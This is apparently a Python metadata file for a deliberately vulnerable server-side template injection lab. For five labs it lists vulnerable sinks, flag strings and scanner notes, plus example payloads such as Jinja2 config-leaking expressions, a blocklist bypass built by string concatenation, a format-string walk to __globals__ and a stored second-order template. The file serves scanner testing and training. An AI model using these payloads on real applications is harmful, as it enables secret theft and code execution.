"""Per-lab detection hints for SSTI labs.

Exposed via /meta/<slug> on ssti.vulnlab.dev.
"""
from __future__ import annotations

CWE_SSTI = "CWE-1336"  # Improper Neutralization of Special Elements Used in a Template Engine
OWASP_2021 = "A03:2021 — Injection (SSTI)"

DETECT_HINTS: dict[str, dict] = {
    "basic": {
        "cwe": CWE_SSTI,
        "owasp": OWASP_2021,
        "subtype": "jinja2-render-template-string",
        "sinks": ["flask.render_template_string(user_input)"],
        "exploit_examples": [
            "/basic/?greeting={{7*7}}",
            "/basic/?greeting={{ config['VULNLAB_SSTI_BASIC'] }}",
        ],
        "success_markers": [
            "49",
            "VULNLAB{ssti-jinja2-template-string-rce}",
        ],
        "tags": ["jinja2", "flask", "render_template_string", "rce-capable"],
        "scanner_should_fire": True,
    },
    "format": {
        "cwe": CWE_SSTI,
        "owasp": OWASP_2021,
        "subtype": "python-str-format-attribute-walk",
        "sinks": ["str.format(user=obj) with user-controlled format string"],
        "exploit_examples": [
            "/format/?template={user.flag}",
            "/format/?template={user.__class__.__init__.__globals__}",
        ],
        "success_markers": [
            "VULNLAB{ssti-str-format-attribute-walk}",
        ],
        "tags": ["python-format", "attribute-walk", "non-jinja2"],
        "scanner_should_fire": True,
        "notes": (
            "Different sink class from Jinja2 SSTI. Tools that only flag "
            "render_template_string / Jinja2 will miss this."
        ),
    },
    "filtered": {
        "cwe": CWE_SSTI,
        "owasp": OWASP_2021,
        "subtype": "jinja2-ssti-substring-blocklist-bypass",
        "sinks": ["render_template_string after substring deny-list"],
        "exploit_examples": [
            "/filtered/?greeting={{ config['VULNLAB_SSTI_FILTERED'] }}",
            "/filtered/?greeting={{ ''|attr('__cl'+'ass__') }}",
        ],
        "success_markers": [
            "VULNLAB{ssti-jinja2-filtered-bypass}",
        ],
        "tags": ["jinja2", "blocklist-bypass", "|attr", "string-concat"],
        "scanner_should_fire": True,
    },
    "sandboxed": {
        "cwe": CWE_SSTI,
        "owasp": OWASP_2021,
        "subtype": "jinja2-sandbox-bypass-via-exposed-global",
        "sinks": ["SandboxedEnvironment + over-privileged registered global"],
        "exploit_examples": [
            "/sandboxed/?greeting={{ dump_diagnostics() }}",
        ],
        "success_markers": [
            "VULNLAB{ssti-jinja2-sandbox-bypassed-via-helper}",
        ],
        "tags": ["jinja2", "sandbox", "registered-global", "design-flaw"],
        "scanner_should_fire": True,
        "notes": (
            "The sandbox is intact — textbook attribute-walk RCE is "
            "blocked. The bug is the helper. Tools that only test for "
            "raw sandbox escape miss this class entirely."
        ),
    },
    "second-order": {
        "cwe": CWE_SSTI,
        "owasp": OWASP_2021,
        "subtype": "second-order-stored-template",
        "sinks": [
            "POST /save stores raw template text (no render)",
            "GET /preview retrieves and calls render_template_string",
        ],
        "exploit_examples": [
            "POST /second-order/save key=evil body={{ config['VULNLAB_SSTI_SECOND_ORDER'] }}",
            "GET /second-order/preview?id=evil",
        ],
        "success_markers": [
            "VULNLAB{ssti-second-order-from-stored-draft}",
        ],
        "tags": ["second-order", "stored", "cross-sink", "cross-endpoint"],
        "scanner_should_fire": True,
        "notes": (
            "Per-sink scanners that only inspect render_template_string "
            "callers won't see that the rendered string was attacker-"
            "controlled. Needs cross-endpoint/cross-request data-flow."
        ),
    },
}
